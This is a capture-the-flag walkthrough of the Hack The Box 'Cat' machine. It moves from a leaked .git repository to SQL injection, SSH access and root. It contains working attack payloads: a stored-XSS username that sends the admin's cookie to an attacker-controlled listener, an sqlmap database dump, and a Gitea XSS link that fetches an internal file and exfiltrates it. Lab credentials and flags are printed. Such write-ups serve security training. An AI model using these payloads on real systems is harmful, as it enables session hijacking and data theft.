# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 80 | HTTP |



# RECONNAISSANCE
---

We need to add `cat.htb` to `/etc/hosts`:

```
echo 'IP cat.htb' | sudo tee -a /etc/hosts
```


![Pasted image 20250415173410.png](../../IMAGES/Pasted%20image%2020250415173410.png)

On the nmap scan, it said `.git` was enabled, we can try using `GitHack` to get the contents of the `.git` directory:

```
Repository: https://github.com/lijiejie/GitHack
```


![Pasted image 20250415175041.png](../../IMAGES/Pasted%20image%2020250415175041.png)

We got a few files, if we check `admin.php`, we can see this:

![Pasted image 20250415175131.png](../../IMAGES/Pasted%20image%2020250415175131.png)


We found there's an user called `axel`, he may be the administrator of the web application, let's proceed with the web stuff then:


![Pasted image 20250415175512.png](../../IMAGES/Pasted%20image%2020250415175512.png)

We can register in here, since we already have the source code of `login.php`, we can do an analysis of it:

```js
// Registration process
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['registerForm'])) {
 $username = $_GET['username'];
 $email = $_GET['email'];
 $password = md5($_GET['password']);

 $stmt_check = $pdo->prepare("SELECT * FROM users WHERE username = :username OR email = :email");
 $stmt_check->execute([':username' => $username, ':email' => $email]);
 $existing_user = $stmt_check->fetch(PDO::FETCH_ASSOC);

 if ($existing_user) {
 $error_message = "Error: Username or email already exists.";
 } else {
 $stmt_insert = $pdo->prepare("INSERT INTO users (username, email, password) VALUES (:username, :email, :password)");
 $stmt_insert->execute([':username' => $username, ':email' => $email, ':password' => $password]);

 if ($stmt_insert) {
 $success_message = "Registration successful!";
 } else {
 $error_message = "Error: Unable to register user.";
 }
 }
}
```

This is where the magic relies, this is vulnerable to XSS, The vulnerable code is in the registration handling where the`username` parameter is directly taken from the user input (`$_GET['username']`) and stored in the database **without sanitization**.

```js
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['registerForm'])) {
 $username = $_GET['username']; //No sanitization here
```

This allows an attacker to inject malicious scripts into the`username` field, which will execute when the username is later displayed on a page that renders it without proper escaping. This means we can try creating a test account to steal the admin's cookie.

Let's begin exploitation.


# EXPLOITATION
---

We can create a malicious username:


```
<script>document.location='http://10.10.15.39:8000/?c='+document.cookie;</script>
```




![Pasted image 20250415180441.png](../../IMAGES/Pasted%20image%2020250415180441.png)


![Pasted image 20250415180114.png](../../IMAGES/Pasted%20image%2020250415180114.png)

Ok, registration went through, we can search for a way to exploit this, once we login, we can see that the `contest.php` page, seems suspicious:

![Pasted image 20250415180212.png](../../IMAGES/Pasted%20image%2020250415180212.png)

We can send in some random data and check if the server is processing our username as code, we can maybe get the admin cookie based on the script we used on our username:

![Pasted image 20250415180304.png](../../IMAGES/Pasted%20image%2020250415180304.png)



![Pasted image 20250415180517.png](../../IMAGES/Pasted%20image%2020250415180517.png)


There we go, since it's been put into inspection, we know someone may be surveilling the data, most probably being the admin, if we check our python server, we can see this:

![Pasted image 20250415182450.png](../../IMAGES/Pasted%20image%2020250415182450.png)

Nice, we got the cookie, since we got the source code of the files, I analyzed all of them and found this SQLI on `accept_cat.php`:

```php
<?php
include 'config.php';
session_start();

if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
 if (isset($_POST['catId']) && isset($_POST['catName'])) {
 $cat_name = $_POST['catName'];
 $catId = $_POST['catId'];
 $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
 $pdo->exec($sql_insert);

 $stmt_delete = $pdo->prepare("DELETE FROM cats WHERE cat_id = :cat_id");
 $stmt_delete->bindParam(':cat_id', $catId, PDO::PARAM_INT);
 $stmt_delete->execute();

 echo "The cat has been accepted and added successfully.";
 } else {
 echo "Error: Cat ID or Cat Name not provided.";
 }
 } else {
 header("Location: /");
 exit();
 }
} else {
 echo "Access denied.";
}
?>

```

The following lines directly inserts the data to the database without a proper sanitization:

```php
if (isset($_POST['catId']) && isset($_POST['catName'])) {
 $cat_name = $_POST['catName'];
 $catId = $_POST['catId'];
 $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
 $pdo->exec($sql_insert);
```


Our vulnerable parameter is `catName`, we can use `sqlmap` in the following way knowing all this:

```
sqlmap -u "http://cat.htb/accept_cat.php" --data "catId=1&catName=catty" --cookie="PHPSESSID=801vfm5g8gtq70mcf4aosm7iov" -p catName --level=5 --risk=3 --dbms=SQLite --technique=B -T "users" --threads=4 --dump
```

If we check the output we can notice this:

![Pasted image 20250416123555.png](../../IMAGES/Pasted%20image%2020250416123555.png)

So, we got an username `rosa`, and a hash, let's crack the hash:

![Pasted image 20250416123641.png](../../IMAGES/Pasted%20image%2020250416123641.png)

We got credentials:

```
rosa:soyunaprincesarosa
```


Let's go into ssh:


![Pasted image 20250416123724.png](../../IMAGES/Pasted%20image%2020250416123724.png)

Let's begin privilege escalation.



# PRIVILEGE ESCALATION
---


We can use `linpeas` to check for a PE vector:

![Pasted image 20250416124804.png](../../IMAGES/Pasted%20image%2020250416124804.png)

We can see `access.log` is here, let's read it:

![Pasted image 20250416124841.png](../../IMAGES/Pasted%20image%2020250416124841.png)

There we go, we got `axel` password:

```
axel:aNdZwgC4tI9gnVXv_e3Q
```

![Pasted image 20250416124915.png](../../IMAGES/Pasted%20image%2020250416124915.png)

We can now read `user.txt`:

```
axel@cat:~$ cat user.txt
5ec867721c1897b5f2cd1d8baa25dcd4
```

If we log into ssh using `axel` credentials, we can notice this:

![Pasted image 20250416125949.png](../../IMAGES/Pasted%20image%2020250416125949.png)

There's a message saying we have mail, we can check the contents of `/var/mail/axel`:

![Pasted image 20250416130053.png](../../IMAGES/Pasted%20image%2020250416130053.png)

It says there's a web application running on port 3000, we can use port forwarding to check the contents of it:

```
ssh -L 3000:127.0.0.1:3000 axel@cat.htb
```

![Pasted image 20250416130234.png](../../IMAGES/Pasted%20image%2020250416130234.png)

This is running `gitea 1.22.0`, we can log in using `axel` credentials, if we dig around, we can notice this:


![Pasted image 20250416130340.png](../../IMAGES/Pasted%20image%2020250416130340.png)

Admin user is on here, seems like we can exploit this to get root access, let's search for an exploit:


![Pasted image 20250416130417.png](../../IMAGES/Pasted%20image%2020250416130417.png)

```
## Vulnerability Description
Gitea 1.22.0 is vulnerable to a Stored Cross-Site Scripting (XSS) vulnerability. This vulnerability allows an attacker to inject malicious scripts that get stored on the server and executed in the context of another user's session.

## Steps to Reproduce
1. Log in to the application.
2. Create a new repository or modify an existing repository by clicking the Settings button from the `$username/$repo_name/settings` endpoint.
3. In the Description field, input the following payload:

 <a href=javascript:alert()>XSS test</a>

4. Save the changes.
5. Upon clicking the repository description, the payload was successfully injected in the Description field. By clicking on the message, an alert box will appear, indicating the execution of the injected script.
```

Nice, we can reproduce these steps, let's craft a more advanced payload to grab sensitive data from the server, for example, we can use this to grab the contents of `index.php`:

```js
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response => response.text()).then(data => fetch('http://10.10.15.39:8000/?response=' + encodeURIComponent(data))).catch(error => console.error('Error:', error));">XSS test</a>
```

In order to make this work, we need to create a repository:

![Pasted image 20250416130652.png](../../IMAGES/Pasted%20image%2020250416130652.png)

And we need to use the payload at the `description` field:

![Pasted image 20250416132041.png](../../IMAGES/Pasted%20image%2020250416132041.png)

![Pasted image 20250416132052.png](../../IMAGES/Pasted%20image%2020250416132052.png)


Once we create the repository, we can send an email back to the administrator which in this case is `jobert`, let's send it like this:

```
echo -e "http://localhost:3000/axel/REPO-NAME" | sendmail jobert@localhost
```

We need to have our python server ready before sending the email, once we send it, we can check this:

![Pasted image 20250416132139.png](../../IMAGES/Pasted%20image%2020250416132139.png)

Let's decode the data:

![Pasted image 20250416132217.png](../../IMAGES/Pasted%20image%2020250416132217.png)

There we go, we got credentials for root:

```
root:IKw75eR0MR7CMIxhH0
```

Let's switch to root:

![Pasted image 20250416132330.png](../../IMAGES/Pasted%20image%2020250416132330.png)

Now we can read `root.txt` and finish:

```
root@cat:/home/axel# cat /root/root.txt
d22c2ea311a3f638c4dbae4cca596120
```


https://www.hackthebox.com/achievement/machine/1872557/646


